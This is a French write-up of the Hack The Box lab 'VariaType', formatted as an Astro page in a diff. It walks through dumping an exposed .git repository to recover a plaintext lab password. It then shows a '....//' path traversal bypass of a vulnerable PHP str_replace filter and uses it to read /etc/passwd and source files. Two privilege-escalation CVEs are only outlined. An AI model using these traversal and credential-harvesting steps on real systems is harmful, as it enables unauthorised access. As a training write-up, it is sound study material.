@@ -1,0 +1,149 @@
+---
+import Layout from '../../layouts/Layout.astro'
+---
+<Layout title="HTB - VariaType">
+
+  <div style="margin-bottom:2rem;">
+    <a href="/writeups" style="color:#475569; font-size:0.82rem;">← writeups</a>
+    <h1 style="font-size:1.8rem; font-weight:700; color:#e2e8f0; margin:0.75rem 0 0.5rem;">HTB - VariaType</h1>
+    <div style="display:flex; flex-wrap:wrap; gap:0.5rem; align-items:center; margin-bottom:0.75rem;">
+      <span class="badge-medium">Medium</span>
+      <span style="color:#64748b;">·</span>
+      <span style="color:#94a3b8; font-size:0.82rem;">Linux (Debian 12)</span>
+      <span style="color:#64748b;">·</span>
+      <span style="color:#475569; font-size:0.8rem;">14 Mar 2026</span>
+    </div>
+    <div style="display:flex; flex-wrap:wrap; gap:0.35rem; margin-top:0.5rem;">
+      <span style="background:rgba(239,68,68,0.1); color:#f87171; border:1px solid rgba(239,68,68,0.25); padding:2px 8px; border-radius:4px; font-size:0.7rem; font-weight:700;">CVE-2025-66034</span>
+      <span style="background:rgba(239,68,68,0.1); color:#f87171; border:1px solid rgba(239,68,68,0.25); padding:2px 8px; border-radius:4px; font-size:0.7rem; font-weight:700;">CVE-2025-47273</span>
+    </div>
+  </div>
+
+  <div style="background:var(--bg-800); border-left:3px solid #e67e22; border-top:1px solid var(--border); border-right:1px solid var(--border); border-bottom:1px solid var(--border); border-radius:0 8px 8px 0; padding:1rem 1.25rem; margin-bottom:2rem;">
+    <div style="color:#64748b; font-size:0.7rem; text-transform:uppercase; letter-spacing:0.05em; margin-bottom:0.4rem;">Résumé</div>
+    <p style="color:#94a3b8; font-size:0.88rem; line-height:1.7; margin:0;">Box Medium Linux — dépôt .git exposé révèle des credentials dans l'historique Git, LFI via str_replace contournable avec ....// , RCE via injection XML dans fonttools varLib (CVE-2025-66034), escalade via setuptools PackageIndex (CVE-2025-47273).</p>
+  </div>
+
+  <div style="margin-bottom:2.5rem;">
+    <div style="color:#334155; font-size:0.78rem; margin-bottom:0.75rem;">$ cat attack_chain.txt</div>
+    <div style="border:1px solid var(--border); border-radius:8px; overflow:hidden;">
+      <div style="background:#050508; padding:0.4rem 1rem; border-bottom:1px solid var(--border); color:#475569; font-size:0.7rem; text-transform:uppercase;">Chaîne d'exploitation</div>
+      {[
+        { n:'1', v:'.git/ exposé → git-dumper', r:'Credentials gitbot depuis l\'historique Git' },
+        { n:'2', v:'LFI download.php?f= (bypass ....//)', r:'Code source complet + architecture Flask' },
+        { n:'3', v:'CVE-2025-66034 — fonttools varLib XML injection', r:'RCE www-data → shell steve' },
+        { n:'4', v:'CVE-2025-47273 — setuptools PackageIndex', r:'Shell root' },
+      ].map((s,i,a) => (
+        <div style={"display:flex; gap:0.75rem; padding:0.7rem 1rem; background:var(--bg-800);" + (i<a.length-1?"border-bottom:1px solid #0d0d15;":"")}>
+          <div style="width:22px; height:22px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:0.7rem; font-weight:700; flex-shrink:0; background:#e67e2222; color:#e67e22; border:1px solid #e67e2244;">{s.n}</div>
+          <div><div style="color:#e2e8f0; font-size:0.82rem; font-weight:600;">{s.v}</div><div style="color:#475569; font-size:0.75rem; margin-top:0.1rem;">→ {s.r}</div></div>
+        </div>
+      ))}
+    </div>
+  </div>
+
+  <div class="prose">
+
+    <h2>1 — Reconnaissance & Git Exposé</h2>
+    <pre is:raw>nmap -sC -sV 10.129.22.11
+echo '10.129.22.11  variatype.htb' | sudo tee -a /etc/hosts
+
+ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
+  -u http://variatype.htb/FUZZ -fc 301,302,404
+# portal [200], services [200]
+
+ffuf -u http://variatype.htb -H 'Host: FUZZ.variatype.htb' -fc 302
+# portal → portal.variatype.htb
+
+# Énumération du sous-domaine portal
+ffuf -u http://portal.variatype.htb/FUZZ ...
+# .git/config  [200]
+# .git/HEAD    [200]
+# .git/index   [200] ← dépôt accessible publiquement !</pre>
+    <pre is:raw>git-dumper http://portal.variatype.htb/.git/ ./portal_git
+cd portal_git
+
+git log --oneline
+# 753b5f5 fix: add gitbot user for automated validation pipeline
+# 5030e79 feat: initial portal implementation
+
+git diff HEAD~1 HEAD
+# +$USERS = [
+# +    'gitbot' => 'G1tB0t_Acc3ss_2025!'
+# +];</pre>
+    <div style="border-left:3px solid #f87171; background:rgba(239,68,68,0.06); padding:0.65rem 1rem; margin:0.75rem 0; border-radius:0 6px 6px 0; font-size:0.82rem; color:#fca5a5;">⚠️ IMPORTANT : "Supprimer" un fichier dans un commit ne supprime PAS les données de l'historique Git. Les credentials restent accessibles via git diff ou git show.</div>
+
+    <h2>2 — LFI via bypass str_replace</h2>
+    <p>Après connexion sur le portail avec gitbot, l'endpoint download.php est découvert. Le code source révèle une protection insuffisante :</p>
+    <pre is:raw># Code PHP vulnérable de download.php
+$file = $_GET['f'] ?? '';
+$file = str_replace('../', '', $file);    // Protection insuffisante !
+$filepath = '/var/www/portal.variatype.htb/public/files/' . $file;
+readfile($filepath);</pre>
+    <p>La séquence <strong>....//</strong> contourne str_replace("../", "") : quand "../" est supprimé du milieu de "..../", le résultat final est toujours "../".</p>
+    <pre is:raw># bypass : ....//  →  str_replace('../', '')  →  ../
+
+python3 lfi.py /etc/passwd
+# root:x:0:0:root:/root:/bin/bash
+# steve:x:1000:1000::/home/steve:/bin/bash
+
+python3 lfi.py /opt/variatype/app.py      # Code source Flask complet
+python3 lfi.py /opt/variatype/script.py   # Script exécuté par le cron de steve
+python3 lfi.py /etc/nginx/nginx.conf</pre>
+
+    <h2>3 — CVE-2025-66034 : fonttools varLib XML Injection</h2>
+    <p>L'endpoint Flask /tools/variable-font-generator/process traite des fichiers .designspace (XML) avec fonttools varLib. CVE-2025-66034 permet via une balise malformée de déclencher une écriture de fichier arbitraire lors du parsing varLib.</p>
+    <pre is:raw># Le fichier .designspace est du XML — vecteur d'injection
+# Objectif : injecter du code dans /opt/variatype/script.py
+# (exécuté périodiquement par le cron de steve)
+
+# Upload du fichier .designspace malveillant via le formulaire Flask
+# → Injection dans script.py → Au prochain cron, code exécuté en tant que steve
+
+ssh steve@10.129.22.11
+cat ~/user.txt</pre>
+
+    <h2>4 — CVE-2025-47273 : setuptools → root</h2>
+    <pre is:raw>sudo -l
+# Un script Python avec sudo → CVE-2025-47273
+
+python3 -c "import setuptools; print(setuptools.__version__)"
+# Vérifier si la version est vulnérable</pre>
+    <p>CVE-2025-47273 affecte la classe PackageIndex de setuptools. La vulnérabilité permet de manipuler le chemin de résolution des packages pour charger un module malveillant lors de l'invocation sudo.</p>
+    <pre is:raw># CVE-2025-47273 — créer un package malveillant dans un répertoire contrôlé
+# La classe PackageIndex résout les packages en cherchant dans des chemins manipulables
+
+cat /root/root.txt</pre>
+
+  </div>
+
+  <div style="margin-bottom:2.5rem;">
+    <h2 style="color:var(--cyber); font-size:1.05rem; font-weight:700; border-bottom:1px solid rgba(0,255,157,0.2); padding-bottom:0.4rem; margin-bottom:1rem;">Leçons apprises</h2>
+    <div style="display:flex; flex-direction:column; gap:0.5rem;">
+      {[
+        '.git/ exposé sur un serveur web = compromission totale possible — cartographier en priorité',
+        'str_replace("../", "") est contournable avec ....// — protection nettement insuffisante',
+        'Les fichiers .designspace sont du XML — toujours penser injection XML/XXE',
+        'setuptools CVE-2025-47273 : vérifier la version lors d\'un sudo sur script Python',
+        'Les crons sont des vecteurs d\'escalade — surveiller les scripts exécutés périodiquement',
+      ].map(l => (
+        <div style="display:flex; gap:0.6rem; color:#94a3b8; font-size:0.85rem;"><span style="color:var(--cyber); flex-shrink:0;">→</span>{l}</div>
+      ))}
+    </div>
+  </div>
+
+  <div>
+    <h2 style="color:var(--cyber); font-size:1.05rem; font-weight:700; border-bottom:1px solid rgba(0,255,157,0.2); padding-bottom:0.4rem; margin-bottom:1rem;">Outils utilisés</h2>
+    <div style="display:flex; flex-wrap:wrap; gap:0.4rem;">
+      {['nmap','ffuf','git-dumper','python3 (LFI)','burpsuite','fonttools-exploit','ssh','sudo'].map(t => (
+        <span style="background:#050508; border:1px solid #1a1a2e; padding:3px 10px; border-radius:6px; font-size:0.75rem; color:#64748b; font-family:monospace;">{t}</span>
+      ))}
+    </div>
+  </div>
+
+  <div style="margin-top:3rem; padding-top:1.5rem; border-top:1px solid var(--border); display:flex; justify-content:space-between;">
+    <a href="/writeups" style="color:#475569; font-size:0.85rem;">← Tous les writeups</a>
+    <a href="/about" style="color:var(--cyber); font-size:0.85rem;">About →</a>
+  </div>
+
+</Layout>
